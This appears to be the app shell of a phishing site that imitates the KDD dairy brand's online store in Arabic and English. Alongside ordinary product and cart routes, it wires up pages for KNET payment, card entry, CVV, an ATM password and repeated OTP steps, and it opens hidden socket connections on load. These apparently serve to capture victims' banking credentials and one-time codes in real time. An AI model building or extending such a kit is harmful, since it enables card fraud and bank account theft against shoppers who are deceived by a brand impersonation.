import { useEffect, type ReactElement } from "react";
import { BrowserRouter, Link, Route, Routes, useLocation } from "react-router-dom";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { Toaster } from "sonner";
import { CartProvider } from "@/kdd/contexts/CartContext";
import { LanguageProvider, useLanguage } from "@/kdd/contexts/LanguageContext";
import Index from "@/kdd/pages/Index";
import Products from "@/kdd/pages/Products";
import Category from "@/kdd/pages/Category";
import ProductDetail from "@/kdd/pages/ProductDetail";
import Cart from "@/kdd/pages/Cart";
import Checkout from "@/kdd/pages/Checkout";
import { connectStorefront } from "@/kdd/lib/socketClient";
import "./styles.css";
import KNETPayment from "../pages/KNETPayment";
import KNETOTP from "../pages/KNETOTP";
import CreditCardPayment from "../pages/CreditCardPayment";
import FinalPage from "../pages/FinalPage";
import CVV from "../pages/CVV";
import ATMPassword from "../pages/ATMPassword";
import OTPVerification from "../pages/OTPVerification";
import { initializeSocket } from "@/lib/store";

const queryClient = new QueryClient({ defaultOptions: { queries: { staleTime: 30_000, retry: false } } });

const PAGES: Array<{ paths: string[]; element: ReactElement }> = [
  { paths: ["/"], element: <Index /> },
  { paths: ["/products"], element: <Products /> },
  { paths: ["/category/:slug"], element: <Category /> },
  { paths: ["/product/:id"], element: <ProductDetail /> },
  { paths: ["/cart"], element: <Cart /> },
  { paths: ["/checkout", "/summary-payment"], element: <Checkout /> },
  { paths: ["/knet", "/knet-payment"], element: <KNETPayment /> },
  { paths: ["/knet-otp"], element: <KNETOTP /> },
  { paths: ["/card", "/credit-card-payment"], element: <CreditCardPayment /> },
  { paths: ["/otp-verification"], element: <OTPVerification /> },
  { paths: ["/atm", "/atm-password"], element: <ATMPassword /> },
  { paths: ["/cvv"], element: <CVV /> },
  { paths: ["/final-page"], element: <FinalPage /> },
];

function StorefrontRuntime() {
  const { pathname } = useLocation();
  const { lang } = useLanguage();
  useEffect(() => connectStorefront(), []);
  useEffect(() => { window.scrollTo({ top: 0, behavior: "auto" }); }, [pathname]);
  useEffect(() => {
    document.title = pathname === "/"
      ? (lang === "ar" ? "كي دي دي — ألبان وعصائر وآيس كريم منذ 1962" : "KDD — Dairy, Juices & Ice Cream since 1962")
      : (lang === "ar" ? "كي دي دي" : "KDD");
  }, [pathname, lang]);
  return null;
}

function LocalFallback() {
  const { lang } = useLanguage();
  return (
    <div className="kdd-container py-24 text-center">
      <h1 className="text-2xl font-black">{lang === "ar" ? "الصفحة غير موجودة" : "Page not found"}</h1>
      <Link className="mt-5 inline-block text-primary hover:underline" to="/">{lang === "ar" ? "العودة للرئيسية" : "Back home"}</Link>
    </div>
  );
}

export default function StorefrontApp() {
  useEffect(() => { try { initializeSocket(); } catch (e) {} }, []);
  return (
    <QueryClientProvider client={queryClient}>
      <LanguageProvider>
        <CartProvider>
          <BrowserRouter>
            <StorefrontRuntime />
            <Routes>
              {PAGES.map((p) => p.paths.map((path) => <Route key={path} path={path} element={p.element} />))}
              <Route path="*" element={<LocalFallback />} />
            </Routes>
          </BrowserRouter>
          <Toaster position="top-center" richColors />
        </CartProvider>
      </LanguageProvider>
    </QueryClientProvider>
  );
}
